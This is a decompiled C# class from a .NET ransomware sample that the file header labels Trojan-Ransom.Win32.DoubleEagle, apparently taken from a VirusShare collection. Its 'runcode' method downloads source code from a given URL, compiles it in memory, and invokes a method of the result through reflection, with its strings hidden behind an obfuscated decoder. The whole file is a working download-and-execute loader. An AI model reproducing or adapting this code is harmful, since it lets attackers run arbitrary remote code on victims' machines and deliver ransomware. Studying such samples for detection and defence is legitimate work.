// Decompiled with JetBrains decompiler
// Type: a.DynamicCode
// Assembly: a, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F9E5355F-B81F-44C3-B871-657587613D56
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.DoubleEagle.oy-d5b498f54e9295f6ea542e3d341d03f3f4f4c5d98da494db89d0d61eb31c41a2.exe

using CmD6QmcsgiPn76lhP6;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.CodeDom.Compiler;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;

namespace a
{
  [StandardModule]
  internal sealed class DynamicCode
  {
    [MethodImpl(MethodImplOptions.NoInlining)]
    public static object runcode(string URLToCode)
    {
      object obj;
      try
      {
        ICodeCompiler compiler = new VBCodeProvider().CreateCompiler();
        CompilerParameters options = new CompilerParameters();
        options.ReferencedAssemblies.Add(LSH1IvEDia2sKbWgPr.ySdEOnZ47(1278));
        options.ReferencedAssemblies.Add(LSH1IvEDia2sKbWgPr.ySdEOnZ47(1302));
        options.ReferencedAssemblies.Add(LSH1IvEDia2sKbWgPr.ySdEOnZ47(1336));
        options.ReferencedAssemblies.Add(LSH1IvEDia2sKbWgPr.ySdEOnZ47(1368));
        options.ReferencedAssemblies.Add(LSH1IvEDia2sKbWgPr.ySdEOnZ47(1420));
        options.ReferencedAssemblies.Add(LSH1IvEDia2sKbWgPr.ySdEOnZ47(1474));
        options.GenerateInMemory = true;
        string source = Encoding.ASCII.GetString(new WebClient()
        {
          Headers = {
            {
              LSH1IvEDia2sKbWgPr.ySdEOnZ47(1514),
              LSH1IvEDia2sKbWgPr.ySdEOnZ47(1542)
            }
          }
        }.DownloadData(URLToCode));
        CompilerResults compilerResults = compiler.CompileAssemblyFromSource(options, source);
        if (compilerResults.Errors.HasErrors)
        {
          obj = (object) (LSH1IvEDia2sKbWgPr.ySdEOnZ47(1612) + compilerResults.Errors[0].Line.ToString() + LSH1IvEDia2sKbWgPr.ySdEOnZ47(1640) + compilerResults.Errors[0].ErrorText);
        }
        else
        {
          object objectValue = RuntimeHelpers.GetObjectValue(compilerResults.CompiledAssembly.CreateInstance(LSH1IvEDia2sKbWgPr.ySdEOnZ47(1648)));
          if (objectValue == null)
          {
            obj = (object) LSH1IvEDia2sKbWgPr.ySdEOnZ47(1678);
          }
          else
          {
            object[] args = new object[1]{ (object) "" };
            try
            {
              obj = (object) RuntimeHelpers.GetObjectValue(objectValue.GetType().InvokeMember(LSH1IvEDia2sKbWgPr.ySdEOnZ47(1724), BindingFlags.InvokeMethod, (Binder) null, RuntimeHelpers.GetObjectValue(objectValue), args)).ToString();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              Exception exception = ex;
              obj = (object) (LSH1IvEDia2sKbWgPr.ySdEOnZ47(1736) + exception.Message);
              ProjectData.ClearProjectError();
            }
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        obj = (object) (LSH1IvEDia2sKbWgPr.ySdEOnZ47(1752) + exception.Message);
        ProjectData.ClearProjectError();
      }
      return obj;
    }
  }
}
